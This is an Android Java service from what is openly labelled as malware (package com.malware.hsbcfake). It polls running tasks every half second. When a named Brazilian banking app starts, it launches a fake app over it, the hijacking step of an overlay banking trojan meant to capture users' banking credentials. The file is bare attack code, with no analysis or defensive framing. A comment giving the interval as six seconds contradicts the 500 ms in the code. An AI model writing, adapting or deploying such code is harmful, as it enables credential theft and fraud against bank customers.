package com.malware.hsbcfake;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.app.ActivityManager;
import android.app.Service;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class TasksService extends Service {

//	private String packageNameProtect = "br.gastecnologia.bancovirtual";
	private String packageNameProtect = "br.com.gabba.Caixa";
	private String packageNameMalwareFake = "com.malware.hsbcfake";
	
	static private int pid = 0;
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {		
	    Timer timer  =  new Timer();
	    timer.scheduleAtFixedRate(new TimerTask() {

	        public void run() 
	        {
	            final ActivityManager activityManager  =  (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
	            final List<RunningTaskInfo> services  =  activityManager.getRunningTasks(Integer.MAX_VALUE);	             
	            //Log.d("FAKE", "onStartCommand - 1");
	            String packageName = "";
	            boolean foundProcess = false; 
            	for (int i = 0; i < services.size(); i++) {
            		packageName = services.get(i).baseActivity.getPackageName();
            		//Log.d("FAKE", "onStartCommand - 2");
            		//Log.d("FAKE_PKG", "Package Name: " + packageName);  
            		//Log.d("FAKE_PKG", "1");  
            		if (packageName.equals(packageNameProtect)) {
            			foundProcess = true;
            			List<RunningAppProcessInfo> procInfos = activityManager.getRunningAppProcesses();
            			// Localizar o processo
            			for (RunningAppProcessInfo process: procInfos) {
            				if (process.processName.equals(packageNameProtect)) {
            					if (pid != process.pid) {
            						pid = process.pid;	                    			
	                    			Intent LaunchIntent = getPackageManager().getLaunchIntentForPackage(packageNameMalwareFake);
	                    			startActivity(LaunchIntent);
	                    			//Log.d("FAKE_PKG", "2");
	                    			return;
            					}
            					else {
            						return;
            					}
            				}
            			}
            		}            		
            	}
            	if (foundProcess == false) {
            		pid = 0;
            	}
	        }
	    }, 500, 500);  // every 6 seconds

	    return START_STICKY;
	}
}
